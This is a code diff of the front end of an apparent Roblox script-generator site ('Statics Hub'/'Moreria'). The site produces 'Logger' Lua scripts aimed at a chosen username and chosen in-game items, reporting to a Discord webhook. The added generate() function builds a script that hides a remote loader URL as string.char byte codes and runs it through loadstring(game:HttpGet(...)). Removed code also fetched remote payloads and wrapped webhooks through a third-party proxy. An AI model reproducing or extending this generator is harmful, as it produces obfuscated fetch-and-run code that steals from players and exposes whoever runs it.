-function getKnownUsers() { try { return JSON.parse(localStorage.getItem('statics_hub_known_users') || '[]'); } catch { return []; } }
-function saveKnownUsers(u) { localStorage.setItem('statics_hub_known_users', JSON.stringify(u)); }
+function getRoles() { try { return JSON.parse(localStorage.getItem('statics_moreria_roles') || '[]'); } catch { return []; } }
+function saveRoles(r) { localStorage.setItem('statics_moreria_roles', JSON.stringify(r)); }
+function getUserRoles() { try { return JSON.parse(localStorage.getItem('statics_moreria_user_roles') || '{}'); } catch { return {}; } }
+function saveUserRoles(r) { localStorage.setItem('statics_moreria_user_roles', JSON.stringify(r)); }
+function getKnownUsers() { try { return JSON.parse(localStorage.getItem('statics_moreria_known_users') || '[]'); } catch { return []; } }
+function saveKnownUsers(u) { localStorage.setItem('statics_moreria_known_users', JSON.stringify(u)); }
 
 function trackKnownUser(user) {
   const users = getKnownUsers();
@@ -2710,14 +949,13 @@ function addRole() {
   saveRoles(roles);
   document.getElementById('newRoleName').value = '';
   renderRoles();
-  renderUsers(); // refresh selects
+  renderUsers();
   showToast('✅ Role "' + name + '" created.', 'success');
 }
 
 function deleteRole(id) {
   let roles = getRoles().filter(r => r.id !== id);
   saveRoles(roles);
-  // Remove from any user who had it
   const ur = getUserRoles();
   for (const u in ur) { if (ur[u] === id) delete ur[u]; }
   saveUserRoles(ur);
@@ -2729,18 +967,18 @@ function renderRoles() {
   const list = document.getElementById('rolesList');
   const roles = getRoles();
   if (!roles.length) {
-    list.innerHTML = '<p class="admin-empty">No roles yet. Create one above.</p>';
+    list.innerHTML = '<p style="font-family:\'Share Tech Mono\',monospace;font-size:0.75rem;color:var(--muted);text-align:center;padding:2rem;font-style:italic;">No roles yet. Create one above.</p>';
     return;
   }
   list.innerHTML = '';
   roles.forEach(role => {
     const row = document.createElement('div');
-    row.className = 'role-row';
+    row.style.cssText = 'display:flex;align-items:center;gap:0.7rem;padding:0.55rem 0.8rem;background:var(--surface);border:1px solid var(--border);border-radius:8px;margin-bottom:0.5rem;';
     row.innerHTML = `
-      <span class="role-color-dot" style="background:${role.color}"></span>
-      <span class="role-row-name">${escHtml(role.name)}</span>
+      <span style="width:12px;height:12px;border-radius:50%;flex-shrink:0;background:${role.color}"></span>
+      <span style="font-family:'Share Tech Mono',monospace;font-size:0.8rem;flex:1;color:var(--text);">${escHtml(role.name)}</span>
       <span class="user-role-badge" style="background:${role.color}33;color:${role.color};border:1px solid ${role.color}66">${escHtml(role.name)}</span>
-      <button class="btn-del-role" onclick="deleteRole('${role.id}')">Delete</button>
+      <button onclick="deleteRole('${role.id}')" style="padding:0.2rem 0.5rem;background:rgba(255,68,68,0.12);border:1px solid rgba(255,68,68,0.3);border-radius:5px;color:var(--danger);font-family:'Share Tech Mono',monospace;font-size:0.6rem;text-transform:uppercase;cursor:pointer;">Delete</button>
     `;
     list.appendChild(row);
   });
@@ -2753,21 +991,16 @@ function renderUsers() {
   const userRoles = getUserRoles();
 
   if (!users.length) {
-    container.innerHTML = '<p class="admin-empty">No users have signed in yet.</p>';
+    container.innerHTML = '<p style="font-family:\'Share Tech Mono\',monospace;font-size:0.75rem;color:var(--muted);text-align:center;padding:2rem;font-style:italic;">No users have signed in yet.</p>';
     return;
   }
 
   container.innerHTML = '';
-
-  // Built-in admin users first
-  const allUsers = [...users];
-
-  allUsers.forEach(user => {
+  users.forEach(user => {
     const row = document.createElement('div');
-    row.className = 'user-rank-row';
+    row.style.cssText = 'display:flex;align-items:center;gap:0.7rem;padding:0.55rem 0.8rem;background:var(--surface);border:1px solid var(--border);border-radius:8px;margin-bottom:0.5rem;';
 
-    // Build role select
-    let selectHtml = `<select class="role-select" id="rolesel-${user.id}">
+    let selectHtml = `<select id="rolesel-${user.id}" style="background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:0.3rem 0.5rem;color:var(--text);font-family:'Share Tech Mono',monospace;font-size:0.7rem;outline:none;cursor:pointer;">
       <option value="">— No role —</option>`;
     roles.forEach(r => {
       const sel = userRoles[user.username] === r.id ? 'selected' : '';
@@ -2775,18 +1008,17 @@ function renderUsers() {
     });
     selectHtml += '</select>';
 
-    // Admin badge if applicable
     const adminEntry = ADMIN_MAP[user.username];
     const adminBadge = adminEntry
       ? `<span class="user-role-badge" style="background:${adminEntry.color}33;color:${adminEntry.color};border:1px solid ${adminEntry.color}66">${adminEntry.title}</span>`
       : '';
 
     row.innerHTML = `
-      <img class="user-rank-avatar" src="${user.avatar}" alt="" onerror="this.src='data:image/svg+xml,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 24 24&quot;><circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;12&quot; fill=&quot;%231a0000&quot;/></svg>'">
-      <span class="user-rank-name">${escHtml(user.global_name || user.username)}<br><span style="font-size:0.62rem;color:var(--muted)">@${escHtml(user.username)}</span></span>
+      <img style="width:30px;height:30px;border-radius:50%;object-fit:cover;background:var(--panel);border:1px solid var(--border);flex-shrink:0;" src="${user.avatar}" alt="" onerror="this.src='data:image/svg+xml,<svg xmlns=&quot;http://www.w3.org/2000/svg&quot; viewBox=&quot;0 0 24 24&quot;><circle cx=&quot;12&quot; cy=&quot;12&quot; r=&quot;12&quot; fill=&quot;%231a2530&quot;/></svg>'">
+      <span style="font-family:'Share Tech Mono',monospace;font-size:0.8rem;color:var(--text);flex:1;">${escHtml(user.global_name || user.username)}<br><span style="font-size:0.62rem;color:var(--muted)">@${escHtml(user.username)}</span></span>
       ${adminBadge}
       ${!adminEntry ? selectHtml : '<span style="font-family:DM Sans,sans-serif;font-size:0.65rem;color:var(--muted)">Built-in admin</span>'}
-      ${!adminEntry ? `<button class="btn-assign-role" onclick="assignRole('${user.username}', '${user.id}')">Assign</button>` : ''}
+      ${!adminEntry ? `<button onclick="assignRole('${user.username}', '${user.id}')" style="padding:0.3rem 0.6rem;background:rgba(141,255,209,0.06);border:1px solid rgba(141,255,209,0.35);border-radius:5px;color:var(--neon);font-family:'Share Tech Mono',monospace;font-size:0.62rem;text-transform:uppercase;cursor:pointer;white-space:nowrap;">Assign</button>` : ''}
     `;
     container.appendChild(row);
   });
@@ -2799,122 +1031,10 @@ function assignRole(username, userId) {
   if (roleId) ur[username] = roleId; else delete ur[username];
   saveUserRoles(ur);
   showToast('✅ Role updated for @' + username, 'success');
-  // Refresh top bar if it's the current user
   if (currentUser && currentUser.username === username) {
     applyUserRoleBadge(username);
   }
 }
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  LIVE CHAT
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function getChatMessages() { try { return JSON.parse(localStorage.getItem('statics_hub_chat') || '[]'); } catch { return []; } }
-function saveChatMessages(m) { localStorage.setItem('statics_hub_chat', JSON.stringify(m.slice(-150))); }
-
-function getUserRoleBadgeHTML(username) {
-  const adminEntry = ADMIN_MAP[username];
-  if (adminEntry) {
-    return `<span class="chat-role-badge" style="background:${adminEntry.color}33;color:${adminEntry.color};border:1px solid ${adminEntry.color}55">${adminEntry.title}</span>`;
-  }
-  const userRoles = getUserRoles();
-  const roleId = userRoles[username];
-  if (roleId) {
-    const roles = getRoles();
-    const role = roles.find(r => r.id === roleId);
-    if (role) return `<span class="chat-role-badge" style="background:${role.color}33;color:${role.color};border:1px solid ${role.color}55">${escHtml(role.name)}</span>`;
-  }
-  return '';
-}
-
-function renderChatMessage(msg) {
-  if (msg.type === 'system') {
-    return `<div class="chat-system-msg">${escHtml(msg.text)}</div>`;
-  }
-  const roleBadge = getUserRoleBadgeHTML(msg.username);
-  const avatarSrc = msg.avatar || `https://cdn.discordapp.com/embed/avatars/0.png`;
-  const time = new Date(msg.ts).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-  return `
-    <div class="chat-msg">
-      <img class="chat-msg-avatar" src="${avatarSrc}" alt="">
-      <div class="chat-msg-body">
-        <div class="chat-msg-name-row">
-          <span class="chat-msg-name">${escHtml(msg.display_name || msg.username)}</span>
-          ${roleBadge}
-        </div>
-        <div class="chat-msg-text">${escHtml(msg.text)}</div>
-        <div class="chat-msg-time">${time}</div>
-      </div>
-    </div>`;
-}
-
-function renderChat() {
-  const msgs = getChatMessages();
-  const container = document.getElementById('chatMessages');
-  container.innerHTML = '<div class="chat-system-msg">— Welcome to Statics Hub Live Chat —</div>';
-  msgs.forEach(m => { container.insertAdjacentHTML('beforeend', renderChatMessage(m)); });
-  container.scrollTop = container.scrollHeight;
-}
-
-function sendChatMessage() {
-  if (!currentUser) { showToast('Sign in to chat.', 'error'); return; }
-  const input = document.getElementById('chatInput');
-  const text = input.value.trim();
-  if (!text) return;
-  const msg = {
-    type: 'user',
-    username: currentUser.username,
-    display_name: currentUser.global_name || currentUser.username,
-    avatar: currentUser.avatar,
-    text,
-    ts: Date.now()
-  };
-  const msgs = getChatMessages();
-  msgs.push(msg);
-  saveChatMessages(msgs);
-  input.value = '';
-  renderChat();
-}
-
-function toggleChat() {
-  chatOpen = !chatOpen;
-  const panel = document.getElementById('chatPanel');
-  if (chatOpen) {
-    panel.classList.remove('hidden');
-    chatUnreadCount = 0;
-    document.getElementById('chatUnread').style.display = 'none';
-    renderChat();
-    setTimeout(() => {
-      const msgs = document.getElementById('chatMessages');
-      msgs.scrollTop = msgs.scrollHeight;
-    }, 50);
-  } else {
-    panel.classList.add('hidden');
-  }
-}
-
-// Poll for new chat messages every 3 seconds
-setInterval(() => {
-  if (!chatOpen) {
-    // Check for new messages silently
-    const msgs = getChatMessages();
-    const lastTs = parseInt(localStorage.getItem('statics_hub_last_chat_ts') || '0');
-    const newMsgs = msgs.filter(m => m.ts > lastTs && m.username !== (currentUser?.username));
-    if (newMsgs.length > 0) {
-      chatUnreadCount += newMsgs.length;
-      const badge = document.getElementById('chatUnread');
-      badge.style.display = 'flex';
-      badge.textContent = chatUnreadCount > 9 ? '9+' : chatUnreadCount;
-    }
-    if (msgs.length) localStorage.setItem('statics_hub_last_chat_ts', msgs[msgs.length-1].ts);
-  } else {
-    renderChat();
-  }
-}, 3000);
-
-// Listen for storage changes from other tabs
-window.addEventListener('storage', e => {
-  if (e.key === 'statics_hub_chat' && chatOpen) renderChat();
-});
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  MODALS
@@ -2929,37 +1049,6 @@ document.querySelectorAll('.modal-overlay').forEach(el => {
     el.classList.add('hidden');
   });
 });
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  NAVIGATION
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function switchToTool(tool) {
-  currentTool = tool;
-  document.getElementById('homeScreen').style.display = 'none';
-  document.getElementById('mainContent').style.display = 'block';
-  document.getElementById('backButton').style.display = 'flex';
-  document.getElementById('brainrotContent').classList.remove('active');
-  document.getElementById('gag2Content').classList.remove('active');
-  document.getElementById('creditsContent').classList.remove('active');
-  if (tool === 'brainrot') {
-    document.getElementById('brainrotContent').classList.add('active');
-    renderList();
-  } else if (tool === 'gag2') {
-    document.getElementById('gag2Content').classList.add('active');
-  } else {
-    document.getElementById('creditsContent').classList.add('active');
-    renderCredits();
-  }
-}
-function backToHome() {
-  document.getElementById('homeScreen').style.display = 'flex';
-  document.getElementById('mainContent').style.display = 'none';
-  document.getElementById('backButton').style.display = 'none';
-  document.getElementById('brainrotContent').classList.remove('active');
-  document.getElementById('gag2Content').classList.remove('active');
-  document.getElementById('creditsContent').classList.remove('active');
-  renderTopHitters();
-}
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //  TOAST
@@ -3156,7 +1245,7 @@ const ANIMALS = [
 ];
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  BRAINROT TOOL LOGIC
+//  MORERIA TOOL LOGIC
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 function addCustomBrainrot() {
   const v = document.getElementById('customBrainrotName').value.trim();
@@ -3174,32 +1263,13 @@ function parsePastedList() {
   renderList(document.getElementById('searchBox').value);
   document.getElementById('pasteCustomListTextarea').value = '';
 }
-function setAdminMode(mode, evt) {
-  adminMode = mode;
-  document.querySelectorAll('.admin-mode-btn').forEach(b => b.classList.remove('active'));
-  if (evt && evt.target) evt.target.classList.add('active');
-  document.getElementById('customAdminInput').style.display = mode === 'custom' ? 'block' : 'none';
-}
-function updateCustomAdmin() { customAdminLoadstring = document.getElementById('customAdminLoadstring').value; }
-
-async function createSentinelProxy(webhookUrl) {
-  const res = await fetch('https://sentinel-proxy.dongdihng.workers.dev/', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ webhook: webhookUrl })
-  });
-  if (!res.ok) throw new Error('Failed to create proxy');
-  const d = await res.json();
-  if (!d.proxyUrl) throw new Error('No proxy URL returned');
-  return d.proxyUrl;
-}
 
 async function uploadToPastefy(script) {
   try {
     const res = await fetch('https://pastefy.app/api/v2/paste', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ title: 'Statics Hub Script', content: script })
+      body: JSON.stringify({ title: 'Statics Hub Moreria Script', content: script })
     });
     const d = await res.json();
     return d.success && d.paste?.id ? `https://pastefy.app/${d.paste.id}/raw` : null;
@@ -3220,16 +1290,39 @@ async function generate() {
     if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
     if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
     if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
-    const finalWebhook = await createSentinelProxy(webhook);
-    const brainrotLines = [...selected].map(n => ` ["${n}"] = true,`).join('\n');
-    let adminPart = '';
-    if (adminMode === 'admin-panel') adminPart = `\n            task.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()\nend)`;
-    else if (adminMode === 'freeze') adminPart = `task.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/BNCsmpLk/raw"))()\nend)`;
-    else if (adminMode === 'custom' && customAdminLoadstring.trim()) adminPart = customAdminLoadstring;
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\ngetgenv().TARGET_USERNAME = "${username}"\ngetgenv().TARGET_BRAINROT = {\n${brainrotLines}\n}\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/3aIMlyLv/raw"))()\nend)\n${adminPart}`;
+
+    const brainrotLines = [...selected].map(n => `    ["${n}"] = true,`).join('\n');
+
+    const script = `-- Statics Hub Moreria Logger
+-- Generated at ${new Date().toISOString()}
+
+getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().TARGET_USERNAME = "${username}"
+getgenv().TARGET_BRAINROT = {
+${brainrotLines}
+}
+
+local C = string.char
+local T = table.concat
+local K = {
+    104,116,116,112,115,58,47,47,
+    97,112,105,46,112,111,108,115,
+    101,99,46,110,101,116,47,108,
+    111,97,100,101,114,47,102,52,
+    54,48,99,51,57,55,100,99,49,
+    101,53,52,102,51,47,50,55,55,
+    98,53,50,48,97,48,53,98,56,
+    97,98,54,53
+}
+local U = {}
+for i = 1, #K do
+    U[i] = C(K[i])
+end
+return assert(loadstring(game:HttpGet(T(U), true)))()`;
+
     const url = await uploadToPastefy(script);
     out.className = 'code-block';
-    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Failed to upload.\n${script}`;
+    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : `-- Failed to upload to Pastefy.\n\n${script}`;
     incrementScriptCount();
     showToast('⚡ Script generated!', 'success');
   } catch (err) {
@@ -3264,12 +1357,14 @@ async function showSuggestions(users) {
   const withAvatars = await Promise.all(users.slice(0,5).map(async u => ({ ...u, avatarUrl: await fetchAvatarUrl(u.id) })));
   withAvatars.forEach(user => {
     const item = document.createElement('div');
-    item.className = 'suggestion-item';
-    item.innerHTML = `<div class="suggestion-avatar"><img src="${user.avatarUrl || ''}" alt=""></div><div class="suggestion-info"><p class="suggestion-username">${user.displayName || user.name}</p><p class="suggestion-handle">@${user.name}</p></div><span class="suggestion-id">${user.id}</span>`;
+    item.style.cssText = 'padding:10px;cursor:pointer;display:flex;align-items:center;gap:10px;border-bottom:1px solid rgba(255,255,255,0.02);transition:background 0.12s;';
+    item.innerHTML = `<div style="width:32px;height:32px;border-radius:50%;overflow:hidden;background:#1a2530;"><img src="${user.avatarUrl || ''}" style="width:100%;height:100%;object-fit:cover;"></div><div style="flex:1;"><p style="font-size:0.85rem;font-weight:600;color:#fff;">${escHtml(user.displayName || user.name)}</p><p style="font-size:0.75rem;color:var(--neon);">@${escHtml(user.name)}</p></div><span style="font-family:'Share Tech Mono',monospace;font-size:0.7rem;color:var(--muted);">${user.id}</span>`;
+    item.onmouseover = () => item.style.background = 'rgba(141,255,209,0.06)';
+    item.onmouseout = () => item.style.background = 'transparent';
     item.onclick = () => { document.getElementById('usernameInput').value = user.name; container.style.display = 'none'; validateUsername(); };
     container.appendChild(item);
   });
-  container.style.display = 'block';
+  container.style.cssText = 'position:absolute;bottom:100%;left:0;right:0;background:var(--surface);border:1px solid var(--border);border-radius:8px;max-height:200px;overflow-y:auto;z-index:100;display:block;';
 }
 
 const debounce = (fn, d) => { let t; return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), d); }; };
@@ -3296,10 +1391,10 @@ function renderList(filter) {
     lbl.className = 'a-name';
     lbl.textContent = animal.name;
     const badge = document.createElement('span');
-    badge.className = animal.rarity === 'OG' ? 'badge-og' : 'badge-secret';
+    badge.className = 'badge-og';
     badge.textContent = animal.rarity;
     const mps = document.createElement('span');
-    mps.className = 'a-meta';
+    mps.style.cssText = 'font-family:\'Share Tech Mono\',monospace;font-size:0.68rem;color:var(--muted);text-align:right;min-width:90px;';
     mps.textContent = animal.mps;
     row.append(cb, lbl, badge, mps);
     row.addEventListener('click', e => { if (e.target !== cb) toggle(animal.name); });
@@ -3317,7 +1412,7 @@ function renderList(filter) {
     lbl.className = 'a-name';
     lbl.textContent = name;
     const badge = document.createElement('span');
-    badge.className = 'badge-secret';
+    badge.className = 'badge-og';
     badge.textContent = 'Custom';
     row.append(cb, lbl, badge);
     row.addEventListener('click', e => { if (e.target !== cb) toggle(name); });
@@ -3329,6 +1424,7 @@ function toggle(name) { selected.has(name) ? selected.delete(name) : selected.ad
 function filterList() { renderList(document.getElementById('searchBox').value); }
 function selectAll() { ANIMALS.forEach(a => selected.add(a.name)); renderList(document.getElementById('searchBox').value); }
 function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
+
 function validateUsername() {
   const v = document.getElementById('usernameInput').value.trim();
   const h = document.getElementById('usernameHint');
@@ -3339,8 +1435,6 @@ function validateWebhook() {
   const v = document.getElementById('webhookInput').value.trim();
   const h = document.getElementById('webhookHint');
   if (!v.startsWith('https://discord.com/api/webhooks/')) { h.classList.add('error'); h.textContent = 'Webhook must start with: https://discord.com/api/webhooks/'; return false; }
-  const rx = /^https:\/\/discord\.com\/api\/webhooks\/(\d{17,20})\/[a-zA-Z0-9_-]{68,}$/;
-  if (!rx.test(v)) { h.classList.add('error'); h.textContent = 'Invalid webhook format.'; return false; }
   h.classList.remove('error'); h.textContent = '✅ Valid Discord webhook.'; return true;
 }
 function copyOut() {
@@ -3348,89 +1442,6 @@ function copyOut() {
   if (!code || code.startsWith('--')) return;
   navigator.clipboard.writeText(code).then(() => {
     const btn = document.getElementById('copyBtn');
-    btn.textContent = '✓ Copied!'; btn.classList.add('ok');
-    setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
-  });
-}
-
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//  GAG2 TOOL LOGIC
-// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function setGag2AdminMode(mode, evt) {
-  gag2AdminMode = mode;
-  document.querySelectorAll('.gag2-admin-mode-btn').forEach(b => b.classList.remove('active'));
-  if (evt && evt.target) evt.target.classList.add('active');
-  document.getElementById('gag2-customAdminInput').style.display = mode === 'custom' ? 'block' : 'none';
-}
-function updateGag2CustomAdmin() { gag2CustomAdminLoadstring = document.getElementById('gag2-customAdminLoadstring').value; }
-
-async function generateGag2() {
-  if (!currentUser) { document.getElementById('loginModal').classList.remove('hidden'); return; }
-  const btn = document.querySelector('.gag2-btn-gen');
-  const out = document.getElementById('gag2-outputBlock');
-  if (btn.disabled) return;
-  btn.disabled = true; btn.textContent = '⏳ Generating...'; btn.style.opacity = '0.6';
-  try {
-    const username = document.getElementById('gag2-usernameInput').value.trim();
-    const webhook = document.getElementById('gag2-webhookInput').value.trim();
-    if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
-    if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
-    const finalWebhook = await createSentinelProxy(webhook);
-    let adminPart = '';
-    if (gag2AdminMode === 'dupe') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/EX1du2IS/raw"))()\nend)`;
-    else if (gag2AdminMode === 'Hub') adminPart = `\ntask.spawn(function()\n   loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/795c7accd08487171484e54a92e75c77.lua"))()\nend)`;
-    else if (gag2AdminMode === 'custom' && gag2CustomAdminLoadstring.trim()) adminPart = `\n${gag2CustomAdminLoadstring}`;
-    const script = `getgenv().WEBHOOK_URL = "${finalWebhook}"\n\ngetgenv().TARGET_USERNAME = "${username}"\n\n\ntask.spawn(function()\n   loadstring(game:HttpGet("https://pastefy.app/CeQfzQXW/raw"))()\nend)${adminPart}`;
-    const url = await uploadToPastefy(script);
-    out.className = 'gag2-code-block';
-    out.textContent = url ? `loadstring(game:HttpGet("${url}"))()` : script;
-    incrementScriptCount();
-    showToast('⚡ Script generated!', 'success');
-  } catch (err) {
-    out.className = 'gag2-code-block empty';
-    out.textContent = err.message || 'An error occurred.';
-  } finally {
-    setTimeout(() => { btn.disabled = false; btn.textContent = '⚡ Generate Script'; btn.style.opacity = '1'; }, 500);
-  }
-}
-
-async function showGag2Suggestions(users) {
-  const container = document.getElementById('gag2-usernameSuggestions');
-  container.innerHTML = '';
-  if (!users.length) { container.style.display = 'none'; return; }
-  const withAvatars = await Promise.all(users.slice(0,5).map(async u => ({ ...u, avatarUrl: await fetchAvatarUrl(u.id) })));
-  withAvatars.forEach(user => {
-    const item = document.createElement('div');
-    item.className = 'gag2-suggestion-item';
-    item.innerHTML = `<div class="gag2-suggestion-avatar"><img src="${user.avatarUrl || ''}" alt=""></div><div class="gag2-suggestion-info"><p class="gag2-suggestion-username">${user.displayName || user.name}</p><p class="gag2-suggestion-handle">@${user.name}</p></div>`;
-    item.onclick = () => { document.getElementById('gag2-usernameInput').value = user.name; container.style.display = 'none'; validateGag2Username(); };
-    container.appendChild(item);
-  });
-  container.style.display = 'block';
-}
-document.getElementById('gag2-usernameInput').addEventListener('input', debounce(async function(e) {
-  const q = e.target.value.trim();
-  if (!q) { document.getElementById('gag2-usernameSuggestions').style.display = 'none'; return; }
-  showGag2Suggestions(await searchRobloxUsers(q));
-}, 300));
-
-function validateGag2Username() {
-  const v = document.getElementById('gag2-usernameInput').value.trim();
-  const h = document.getElementById('gag2-usernameHint');
-  if (v.length < 3) { h.classList.add('error'); h.textContent = 'Username must be at least 3 characters long!'; return false; }
-  h.classList.remove('error'); h.textContent = 'The Roblox username to target in the script.'; return true;
-}
-function validateGag2Webhook() {
-  const v = document.getElementById('gag2-webhookInput').value.trim();
-  const h = document.getElementById('gag2-webhookHint');
-  if (!v.startsWith('https://discord.com/api/webhooks/')) { h.classList.add('error'); h.textContent = 'Webhook must start with: https://discord.com/api/webhooks/'; return false; }
-  h.classList.remove('error'); h.textContent = '✅ Valid Discord webhook.'; return true;
-}
-function copyGag2Out() {
-  const code = document.getElementById('gag2-outputBlock').textContent;
-  if (!code || code.startsWith('--')) return;
-  navigator.clipboard.writeText(code).then(() => {
-    const btn = document.getElementById('gag2-copyBtn');
     btn.textContent = '✓ Copied!'; btn.classList.add('ok');
     setTimeout(() => { btn.textContent = '⧉ Copy'; btn.classList.remove('ok'); }, 2000);
   });
@@ -3448,15 +1459,10 @@ function escHtml(str) {
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 window.addEventListener('DOMContentLoaded', async () => {
   initCounter();
-  await handleDiscordCallback(); // check for OAuth2 redirect
+  await handleDiscordCallback();
   loadStoredUser();
-  if (!currentUser) {
-    showLoginGate();
-  }
+  if (!currentUser) showLoginGate();
   renderList();
-  renderChat();
-  renderTopHitters();
-  renderCredits();
 });
 </script>
 </body>
